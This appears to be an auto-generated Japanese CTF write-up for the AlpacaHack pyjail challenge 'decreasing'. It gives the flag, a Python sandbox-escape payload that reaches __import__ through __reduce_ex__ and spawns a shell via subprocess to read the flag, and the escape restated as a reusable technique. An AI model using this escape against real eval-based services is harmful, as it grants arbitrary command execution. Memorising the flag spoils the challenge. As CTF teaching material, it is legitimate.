# decreasing

| 項目 | 内容 |
| --- | --- |
| 大会 | AlpacaHack Daily |
| 問題番号 | decreasing |
| カテゴリ | misc |
| 配点 | 1 |
| 状態 | 解決済み（公式判定で正解: 2026-11-13 20:54 JST） |
| Flag | `Alpaca{decrea5ing_is_e4si3r_than_incI2eas1ng}` |
| Flag照合 | 公式判定で正解した文字列と一致 |
| タグ | misc, pyjail, python |
| 問題URL | https://alpacahack.com/daily/challenges/decreasing |
| METIS run | `d1c30e1670c14f8185bf5fb10e4a8407` |

## 概要

builtins空のeval＋『\w+トークン長が狭義減少』制約下の pyjail。__reduce_ex__経由でbuiltins取得し subprocess.run(['sh']) 起動、後続stdinでcat。

## 解析

数値は ()==()/()>()/-~(()==()) で桁なし生成。キーは 'x__import__'[1:] で長さスロット調整。トークン長 13>12>11>10>3>2。

## 解法

LINE1: ().__reduce_ex__(-~(()==()))[()>()].__builtins__['x__import__'[()==():]]('subprocess').run(['sh'])  その後 cat /flag*; exit（input()のバッファ奪取回避に遅延）。

## 使用したスクリプト

- [decreasing-remote-solver.py](files/decreasing/decreasing-remote-solver.py)
- [decreasing-search.py](files/decreasing/decreasing-search.py)

## 学び・再利用できる手法

builtins空のeval＋『\w+トークン長が狭義減少』制約下の pyjail。__reduce_ex__経由でbuiltins取得し subprocess.run(['sh']) 起動、後続stdinでcat。

- **No-builtins pyjail under strictly-decreasing token-length constraint**（misc）: Reach the real builtins dict from a literal via ().__reduce_ex__(2)[0].__builtins__ (copyreg function carries real builtins). Satisfy exotic lexical filters (e.g. every \w+ token must be strictly shorter than the previous) with digit-free integers built from comparisons ( ()==() ->1, ()>()->0, -~(()==())->2 ) and by padding a key as 'x__import__'[1:] to fit a length slot; then __import__('subprocess').run(['sh']) and drive the spawned shell via later stdin lines (send them after a delay so the jail's input() does not buffer-steal them).
  - 適用条件: eval with empty __builtins__ plus a lexical filter on token lengths/ordering.

## METISの記録

- 期間: 2026-11-13 20:07 JST 〜 2026-11-13 20:54 JST
- 使用アクション数: 3（official_flag_submission_browser ×1, remote_service_solver_pipe ×2）
- 判定方式: official_browser_observed

### 提出履歴

| 時刻 | 判定 | 回数 |
| --- | --- | --- |
| 2026-11-13 20:54 JST | correct | 1 |

### 配布ファイル・取得データ

| ファイル | サイズ | SHA-256 |
| --- | --- | --- |
| 00-problem.html | 378,539 | `d45014597c4b3a41179469e84191d4d1920d990b6f83dab6cd786fa1f3bfcc54` |
| 01-01-decreasing.tar.gz | 756 | `e8b09717a9f9729f9c94f4ab7338f27fc5adb96eee83a98b9285a48ae3832b86` |
| .metis-remote/cc895e773f90448fb31824e9b00052e1.recv | 51 | `5475b9226611eb08c4b0b4b1aa6b2de0c0523a1d5b79bc73383b404413a198dd` |

### 接続先

- 34.170.146.252:38362

<sub>METIS writeup — 更新: 2026-11-13 21:19 JST</sub>
